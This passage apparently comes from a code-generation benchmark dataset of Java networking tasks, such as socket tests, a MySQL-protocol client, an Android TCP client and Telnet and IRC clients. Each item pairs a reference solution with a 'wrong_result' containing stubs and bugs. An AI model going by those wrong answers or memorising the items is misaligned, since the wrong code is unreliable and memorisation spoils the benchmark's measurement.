    "Canonical_solution": "import java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testConnectionFail() throws IOException, InterruptedException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n    final CountDownLatch latch = new CountDownLatch(1);\n    final CountDownLatch connected = new CountDownLatch(1);\n    DefaultServer.setRootHandler(new ServerSentEventHandler(new ServerSentEventConnectionCallback() {\n        @Override\n        public void connected(final ServerSentEventConnection connection, final String lastEventId) {\n            final XnioIoThread thread = (XnioIoThread) Thread.currentThread();\n            connected.countDown();\n            thread.execute(new Runnable() {\n                @Override\n                public void run() {\n                    connection.send(\"hello\", new ServerSentEventConnection.EventCallback() {\n                        @Override\n                        public void done(ServerSentEventConnection connection, String data, String event, String id) {\n                        }\n\n                        @Override\n                        public void failed(ServerSentEventConnection connection, String data, String event, String id, IOException e) {\n                            latch.countDown();\n                        }\n                    });\n                    if(latch.getCount() > 0) {\n                        WorkerUtils.executeAfter(thread, this, 100, TimeUnit.MILLISECONDS);\n                    }\n                }\n            });\n        }\n    }));\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET / HTTP/1.1\\r\\nHost:\" + DefaultServer.getHostAddress() +\"\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    if(!connected.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n    out.close();\n    in.close();\n    if(!latch.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void testConnection() throws Exception {\n    String host = DefaultServer.getDefaultHost();\n    int port = DefaultServer.getDefaultPort();\n\n    CountDownLatch connectionLatch = new CountDownLatch(1);\n    CountDownLatch responseLatch = new CountDownLatch(1);\n\n    Socket socket = new Socket();\n    Thread connectionThread = new Thread(() -> {\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            connectionLatch.countDown();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    });\n    connectionThread.start();\n\n    if (!connectionLatch.await(10, TimeUnit.SECONDS)) {\n        throw new RuntimeException(\"Connection establishment timed out\");\n    }\n\n    OutputStream out = socket.getOutputStream();\n    String request = \"GET / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\n\\r\\n\";\n    out.write(request.getBytes());\n    out.flush();\n\n    Thread responseThread = new Thread(() -> {\n        try {\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                responseLatch.countDown();\n                break;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    });\n    responseThread.start();\n\n    if (!responseLatch.await(10, TimeUnit.SECONDS)) {\n        throw new RuntimeException(\"Message delivery timed out\");\n    }\n\n    socket.close();\n}"
  },
  {
    "Task_id": 564,
    "Instruction": "Task Description: Write a function that tests abnormal request termination behavior in a client-server communication scenario using TCP sockets. The function should simulate sending a malformed HTTP request with incorrect content length and verify proper connection handling.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP POST request with intentionally incorrect Content-Length header, immediately closes the streams, and verifies if the completion listener is called within a timeout period. This tests the server's handling of abruptly terminated requests.\n\nInput: \n- None (uses class-level DefaultServer.getDefaultServerAddress() and completionListenerCalledLatch)\n- Implicit input through class attributes:\n  - DefaultServerAddress: Server endpoint address\n  - completionListenerCalledLatch: CountDownLatch for synchronization\n  - completionListenerCalled: boolean flag to verify listener invocation\n\nOutput: \n- None (void return type)\n- Side effects:\n  - Throws IOException if socket operations fail\n  - Throws InterruptedException if await is interrupted\n  - Asserts completionListenerCalled is true\n  - Closes socket resources in finally block",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    socket.connect(DefaultServer.getDefaultServerAddress());\n    try {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 10000; ++i) {\n            sb.append(\"hello world\\r\\n\");\n        }\n        String request = \"POST / HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n        OutputStream outputStream = socket.getOutputStream();\n\n        outputStream.write(request.getBytes(\"US-ASCII\"));\n        socket.getInputStream().close();\n        outputStream.close();\n\n        completionListenerCalledLatch.await(5, TimeUnit.SECONDS);\n        Assert.assertTrue(completionListenerCalled);\n    } finally {\n        IoUtils.safeClose(socket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket(DefaultServer.getDefaultServerAddress());\n    try {\n        OutputStream out = socket.getOutputStream();\n        String request = \"POST / HTTP/1.1\\r\\n\" +\n                         \"Content-Length: 5\\r\\n\" +\n                         \"Content-Type: text/plain\\r\\n\\r\\n\" +\n                         \"test\";\n        out.write(request.getBytes());\n        out.flush();\n        socket.close();\n    } finally {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    if (!completionListenerCalledLatch.await(5, TimeUnit.SECONDS)) {\n        throw new AssertionError(\"Completion listener not called within timeout\");\n    }\n\n    if (!completionListenerCalled) {\n        throw new AssertionError(\"Completion listener not called\");\n    }\n}"
  },
  {
    "Task_id": 565,
    "Instruction": "Task Description: Create a Java class that establishes and manages a TCP connection to a database server using socket programming, including authentication and basic query functionality.\n\nClass Description: The UrlConnection class provides functionality to connect to a database server, authenticate, execute queries, and manage the connection lifecycle. It handles MySQL protocol communication including handshake, authentication, and basic command execution.\n\nAttributes:\n- host: String - The hostname or IP address of the database server\n- port: int - The port number of the database server\n- user: String - The username for authentication\n- password: String - The password for authentication\n- database: String - The name of the database to connect to\n- socket: Socket - The TCP socket connection to the server\n- in: InputStream - Input stream for reading data from the server\n- out: OutputStream - Output stream for writing data to the server\n- charsetIndex: int - The character set index used for communication\n- isClosed: AtomicBoolean - Flag indicating whether the connection is closed\n\nMethods:\n- UrlConnection(String, int, String, String, String) -> void - Constructor that initializes connection parameters\n- connect(int) -> void - Establishes a connection to the server with specified timeout\n- getServerList() -> List<CobarNode> - Executes a query to retrieve server list information\n- close() -> void - Closes the connection and releases resources\n- getRowList(int) -> List<CobarNode> - Helper method to process query result rows\n- auth411(HandshakePacket) -> BinaryPacket - Handles MySQL 4.1 authentication protocol\n- auth323(byte, byte[]) -> void - Handles MySQL 3.23 authentication protocol\n- getClientFlags() -> long - Returns client capability flags for MySQL protocol",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class UrlConnection {\n\n    private String host;\n    private int port;\n    private String user;\n    private String password;\n    private String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex;\n    private AtomicBoolean isClosed;\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(int timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n        socket.connect(new InetSocketAddress(host, port), timeout);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n\n        BinaryPacket initPacket = new BinaryPacket();\n        initPacket.read(in);\n        HandshakePacket hsp = new HandshakePacket();\n        hsp.read(initPacket);\n\n        this.charsetIndex = hsp.serverCharsetIndex & 0xff;\n\n        BinaryPacket bin = null;\n        try {\n            bin = auth411(hsp);\n        } catch (NoSuchAlgorithmException e) {\n            throw new IllegalArgumentException(e);\n        }\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        case EOFPacket.FIELD_COUNT:\n            auth323(bin.packetId, hsp.seed);\n            break;\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    public List<CobarNode> getServerList() throws IOException {\n        CommandPacket cmd = new CommandPacket();\n        cmd.packetId = 0;\n        cmd.command = 3;\n        cmd.arg = \"SHOW COBAR_CLUSTER\".getBytes();\n        cmd.write(out);\n        out.flush();\n\n        int fieldCount = 0;\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case ErrorPacket.FIELD_COUNT: {\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        }\n        default:\n            ResultSetHeaderPacket rsh = new ResultSetHeaderPacket();\n            rsh.read(bin);\n            fieldCount = rsh.fieldCount;\n        }\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return getRowList(fieldCount);\n            }\n            default:\n                continue;\n            }\n        }\n    }\n\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                }\n            }\n        }\n    }\n\n    private List<CobarNode> getRowList(int fieldCount) throws IOException {\n        List<CobarNode> list = new LinkedList<CobarNode>();\n        BinaryPacket bin = null;\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return list;\n            }\n            default:\n                RowDataPacket row = new RowDataPacket(fieldCount);\n                row.read(bin);\n                String host = new String(row.fieldValues.get(0));\n                int weight = Integer.parseInt(new String(row.fieldValues.get(1)));\n                list.add(new CobarNode(host, weight));\n            }\n        }\n    }\n\n    private BinaryPacket auth411(HandshakePacket hsp) throws IOException, NoSuchAlgorithmException {\n        AuthPacket ap = new AuthPacket();\n        ap.packetId = 1;\n        ap.clientFlags = getClientFlags();\n        ap.maxPacketSize = 1024 * 1024 * 16;\n        ap.charsetIndex = charsetIndex;\n        ap.user = user;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            byte[] password = passwd.getBytes();\n            byte[] seed = hsp.seed;\n            byte[] restOfScramble = hsp.restOfScrambleBuff;\n            byte[] authSeed = new byte[seed.length + restOfScramble.length];\n            System.arraycopy(seed, 0, authSeed, 0, seed.length);\n            System.arraycopy(restOfScramble, 0, authSeed, seed.length, restOfScramble.length);\n            ap.password = SecurityUtil.scramble411(password, authSeed);\n        }\n        ap.database = database;\n        ap.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    private void auth323(byte packetId, byte[] seed) throws IOException {\n        Reply323Packet r323 = new Reply323Packet();\n        r323.packetId = ++packetId;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            r323.seed = SecurityUtil.scramble323(passwd, new String(seed)).getBytes();\n        }\n        r323.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    private static long getClientFlags() {\n        int flag = 0;\n        flag |= Capabilities.CLIENT_LONG_PASSWORD;\n        flag |= Capabilities.CLIENT_FOUND_ROWS;\n        flag |= Capabilities.CLIENT_LONG_FLAG;\n        flag |= Capabilities.CLIENT_CONNECT_WITH_DB;\n        flag |= Capabilities.CLIENT_ODBC;\n        flag |= Capabilities.CLIENT_IGNORE_SPACE;\n        flag |= Capabilities.CLIENT_PROTOCOL_41;\n        flag |= Capabilities.CLIENT_INTERACTIVE;\n        flag |= Capabilities.CLIENT_IGNORE_SIGPIPE;\n        flag |= Capabilities.CLIENT_TRANSACTIONS;\n        flag |= Capabilities.CLIENT_SECURE_CONNECTION;\n        return flag;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.Socket;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class UrlConnection {\n    private String host;\n    private int port;\n    private String user;\n    private String password;\n    private String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex;\n    private AtomicBoolean isClosed = new AtomicBoolean(false);\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n    }\n\n    public void connect(int timeout) throws Exception {\n        if (isClosed.get()) {\n            throw new IllegalStateException(\"Connection is already closed\");\n        }\n        socket = new Socket(host, port);\n        socket.setSoTimeout(timeout);\n        in = socket.getInputStream();\n        out = socket.getOutputStream();\n        // Perform handshake and authentication\n        handshake();\n        authenticate();\n    }\n\n    private void handshake() throws Exception {\n        // Send initial handshake packet\n        byte[] packet = new byte[0];\n        // Assuming HandshakePacket is a class that can be converted to bytes\n        // This is a placeholder for actual handshake logic\n    }\n\n    private void authenticate() throws Exception {\n        // Handle authentication based on protocol version\n        // Placeholder for actual authentication logic\n    }\n\n    public List<CobarNode> getServerList() throws Exception {\n        if (isClosed.get()) {\n            throw new IllegalStateException(\"Connection is closed\");\n        }\n        // Send query to retrieve server list\n        // Placeholder for actual query execution\n        return null;\n    }\n\n    public void close() {\n        if (!isClosed.get()) {\n            try {\n                if (out != null) out.close();\n                if (in != null) in.close();\n                if (socket != null) socket.close();\n            } catch (Exception e) {\n                // Handle exception\n            }\n            isClosed.set(true);\n        }\n    }\n\n    private List<CobarNode> getRowList(int rowCount) throws Exception {\n        // Process query result rows\n        // Placeholder for actual row processing\n        return null;\n    }\n\n    private BinaryPacket auth411(HandshakePacket handshakePacket) {\n        // Handle MySQL 4.1 authentication\n        // Placeholder for actual authentication logic\n        return null;\n    }\n\n    private void auth323(byte authSwitch, byte[] authResponse) {\n        // Handle MySQL 3.23 authentication\n        // Placeholder for actual authentication logic\n    }\n\n    private long getClientFlags() {\n        // Return client capability flags\n        return 0;\n    }\n}"
  },
  {
    "Task_id": 567,
    "Instruction": "Task Description: Implement a TCP client class in Java that handles network communication with a server, including connection management, data transmission, and reception with proper error handling and resource management.\n\nClass Description: The TcpClient class establishes and maintains a TCP connection to a specified server, sends data packets, and receives responses. It uses a custom protocol with 8-byte headers (4 bytes for type, 4 bytes for length) followed by the message body. The class runs network operations on a dedicated background thread and provides callback mechanisms for received data.\n\nAttributes:\n- TAG: String - Tag for logging purposes\n- PACKAGE_HEAD_LENGTH: int - Fixed length of packet header (8 bytes)\n- receiveListener: ReceiveListener - Callback interface for received data\n- hostip: String - Server IP address to connect to\n- port: int - Server port number\n- socketClient: Socket - The TCP socket instance\n- handler: Handler - Handler for background thread operations\n- receiveThread: Thread - Thread for receiving data\n\nMethods:\n- TcpClient() -> void - Constructor that initializes the background thread and attempts connection\n- tryConnect() -> void - Internal method to attempt server connection in a loop\n- connect() -> boolean - Establishes socket connection to server (returns success status)\n- send(byte[] data) -> void - Sends data to the server (runs on background thread)\n- onReceive(ReceiveListener receiveListener) -> void - Sets the receive callback listener\n- destroy() -> void - Cleans up resources and stops all network operations\n- closeAll() -> void - Safely closes socket and releases resources\n- startReceive() -> void - Starts the data receiving thread\n- getLengthFromHeadByte(byte[] b) -> int - Extracts message length from header bytes\n- getTypeFromHeadByte(byte[] b) -> int - Extracts message type from header bytes\n\nNested Classes:\n- Receiver implements Runnable - Background thread implementation for continuous data reception",
    "Canonical_solution": "import android.os.Handler;\nimport android.os.HandlerThread;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.Arrays;\n\npublic class TcpClient {\n    private static final String TAG = TcpClient.class.getSimpleName();\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n\n    private ReceiveListener receiveListener;\n    private String hostip = \"192.168.3.28\";\n    private int port = 2233;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient() {\n        HandlerThread tcpThread = new HandlerThread(\"tcpThread\");\n        tcpThread.start();\n        handler = new Handler(tcpThread.getLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        handler.post(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n            }\n        });\n    }\n\n    private boolean connect() {\n        closeAll();\n        try {\n            socketClient = new Socket();\n            SocketAddress socAddress = new InetSocketAddress(hostip, port);\n            socketClient.connect(socAddress, 5000);\n            Log.i(TAG, \"socket connected successfully\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n\n    public void send(byte[] data) {\n        Log.d(TAG, \"send data len:\" + data.length);\n        handler.post(() -> {\n            try {\n                OutputStream outputStream = socketClient.getOutputStream();\n                outputStream.write(data);\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient == null || socketClient.isClosed() || !socketClient.isConnected()) {\n            return;\n        }\n        try {\n            socketClient.shutdownInput();\n            socketClient.shutdownOutput();\n            socketClient.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                if (receiveThread.isInterrupted()) {\n                    break;\n                }\n                try {\n                    InputStream inputStream = socketClient.getInputStream();\n                    boolean badPackage = false;\n                    int countHeadBytesLength = 0;\n                    byte[] headData = new byte[PACKAGE_HEAD_LENGTH];\n                    while (countHeadBytesLength < PACKAGE_HEAD_LENGTH) {\n                        int result = inputStream.read(headData, countHeadBytesLength, PACKAGE_HEAD_LENGTH - countHeadBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countHeadBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    int packageType = getTypeFromHeadByte(headData);\n                    int packageBodyBytesLength = getLengthFromHeadByte(headData);\n                    Log.d(TAG, \"new data received type:\" + packageType + \" body len:\" + packageBodyBytesLength);\n\n                    int countBodyBytesLength = 0;\n                    byte[] bodyData = new byte[packageBodyBytesLength];\n                    while (countBodyBytesLength < packageBodyBytesLength) {\n                        int result = inputStream.read(bodyData, countBodyBytesLength, packageBodyBytesLength - countBodyBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countBodyBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(packageType, bodyData);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    if (receiveThread.isInterrupted()) {\n                        break;\n                    }\n                    tryConnect();\n                    break;\n                }\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[4] & 0x00FF;\n        int ch2 = b[5] & 0x00FF;\n        int ch3 = b[6] & 0x00FF;\n        int ch4 = b[7] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n\n    private int getTypeFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[0] & 0x00FF;\n        int ch2 = b[1] & 0x00FF;\n        int ch3 = b[2] & 0x00FF;\n        int ch4 = b[3] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class TcpClient {\n    private static final String TAG = \"TcpClient\";\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n    private ReceiveListener receiveListener;\n    private String hostip;\n    private int port;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient(String hostip, int port) {\n        this.hostip = hostip;\n        this.port = port;\n        handler = new Handler(Looper.getMainLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        while (true) {\n            if (connect()) {\n                break;\n            }\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private boolean connect() {\n        try {\n            socketClient = new Socket(hostip, port);\n            startReceive();\n            return true;\n        } catch (IOException e) {\n            Log.e(TAG, \"Connection failed\", e);\n            return false;\n        }\n    }\n\n    public void send(byte[] data) {\n        new Thread(() -> {\n            try {\n                OutputStream os = socketClient.getOutputStream();\n                os.write(data);\n                os.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient != null) {\n            try {\n                socketClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void startReceive() {\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private int getLengthFromHeadByte(byte[] b) {\n        return (b[0] & 0xFF) << 24 | (b[1] & 0xFF) << 16 | (b[2] & 0xFF) << 8 | (b[3] & 0xFF);\n    }\n\n    private int getTypeFromHeadByte(byte[] b) {\n        return (b[4] & 0xFF) << 24 | (b[5] & 0xFF) << 16 | (b[6] & 0xFF) << 8 | (b[7] & 0xFF);\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while (true) {\n                try {\n                    bytesRead = socketClient.getInputStream().read(buffer);\n                    if (bytesRead <= 0) {\n                        continue;\n                    }\n                    int pos = 0;\n                    while (pos < bytesRead) {\n                        if (pos + 8 > bytesRead) {\n                            break;\n                        }\n                        byte[] header = Arrays.copyOfRange(buffer, pos, pos + 8);\n                        int length = getLengthFromHeadByte(header);\n                        int type = getTypeFromHeadByte(header);\n                        if (pos + 8 + length > bytesRead) {\n                            break;\n                        }\n                        byte[] body = Arrays.copyOfRange(buffer, pos + 8, pos + 8 + length);\n                        if (receiveListener != null) {\n                            receiveListener.onReceived(body);\n                        }\n                        pos += 8 + length;\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 568,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for network communication, including connection management and data transmission.\n\nClass Description: The TelnetTransport class provides TCP client capabilities for establishing connections, sending/receiving data, and managing network resources. It handles multiple IP addresses for a given hostname and provides basic I/O operations.\n\nAttributes:\n- socket: Socket - The underlying TCP socket for network communication\n- is: InputStream - Input stream for receiving data from the server\n- os: OutputStream - Output stream for sending data to the server\n- connected: boolean - Connection status flag indicating whether the client is currently connected\n\nMethods:\n- connect(String hostname, int port) -> void - Establishes a connection to the specified host and port, trying all available IP addresses for the hostname. Throws IOException on connection failure.\n- close() -> void - Closes the connection and releases all network resources. Handles cleanup gracefully.\n- flush() -> void - Flushes the output stream to ensure all buffered data is sent. Throws IOException on failure.\n- isConnected() -> boolean - Returns the current connection status (true if connected).\n- read(byte[] buffer, int start, int len) -> int - Reads data from the input stream into the buffer. Returns number of bytes read or throws IOException if connection is closed.\n- write(byte[] buffer) -> void - Writes the entire buffer to the output stream. Throws IOException on failure.\n- write(int c) -> void - Writes a single byte to the output stream. Throws IOException on failure.\n- tryAllAddresses(Socket sock, String host, int port) -> void - Private helper method that attempts connection to all IP addresses associated with a hostname. Throws SocketTimeoutException if all attempts fail.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.net.UnknownHostException;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected = false;\n\n    public void connect(String hostname, int port) throws IOException {\n        socket = new Socket();\n        tryAllAddresses(socket, hostname, port);\n        connected = true;\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress addr : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(addr, port));\n                return;\n            } catch (SocketTimeoutException ignored) {\n            }\n        }\n        throw new SocketTimeoutException(\"Could not connect; socket timed out\");\n    }\n\n    public void close() {\n        connected = false;\n        if (socket != null) {\n            try {\n                socket.close();\n                socket = null;\n            } catch (IOException e) {\n                System.err.println(\"Error closing socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void flush() throws IOException {\n        if (os != null) {\n            os.flush();\n        }\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        int n = is.read(buffer, start, len);\n        if (n < 0) {\n            throw new IOException(\"Remote end closed connection.\");\n        }\n        return n;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (os != null) {\n            os.write(buffer);\n        }\n    }\n\n    public void write(int c) throws IOException {\n        if (os != null) {\n            os.write(c);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.*;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected;\n\n    public void connect(String hostname, int port) throws IOException {\n        tryAllAddresses(socket, hostname, port);\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n        connected = true;\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress addr : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(addr, port));\n                return;\n            } catch (IOException e) {\n                // Continue to next address\n            }\n        }\n        throw new SocketTimeoutException(\"Failed to connect to all addresses\");\n    }\n\n    public void close() throws IOException {\n        if (connected) {\n            socket.close();\n            connected = false;\n        }\n    }\n\n    public void flush() throws IOException {\n        os.flush();\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        return is.read(buffer, start, len);\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(buffer);\n    }\n\n    public void write(int c) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(c);\n    }\n}"
  },
  {
    "Task_id": 569,
    "Instruction": "Task Description: Create a Java class that implements an IRC client connection using TCP sockets, with built-in monitoring capabilities through Stetho for network event reporting.\n\nClass Description: The IRCClientConnection class establishes and manages a connection to an IRC server, handles message sending/receiving, and provides monitoring hooks for network events. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- mReporter: [StethoReporter] - Handles network event reporting to Stetho\n- mSocket: [Socket] - The TCP socket connection to the IRC server\n- mInput: [BufferedReader] - Stream for reading incoming messages\n- mOutput: [BufferedWriter] - Stream for sending outgoing messages\n\nMethods:\n- connect: [String host, int port] -> [IRCClientConnection] - Static factory method that establishes a connection to the specified IRC server\n- read: [] -> [String] - Reads a line from the server input stream and handles PING/PONG protocol\n- send: [String message] -> [void] - Sends a message to the server\n- maybeHandleIncomingMessage: [String message] -> [boolean] - Handles protocol-specific messages (like PING)\n- close: [] -> [void] - Closes all connection resources (implements Closeable)\n- StethoReporter (inner class): [] -> [] - Handles all Stetho-specific network event reporting",
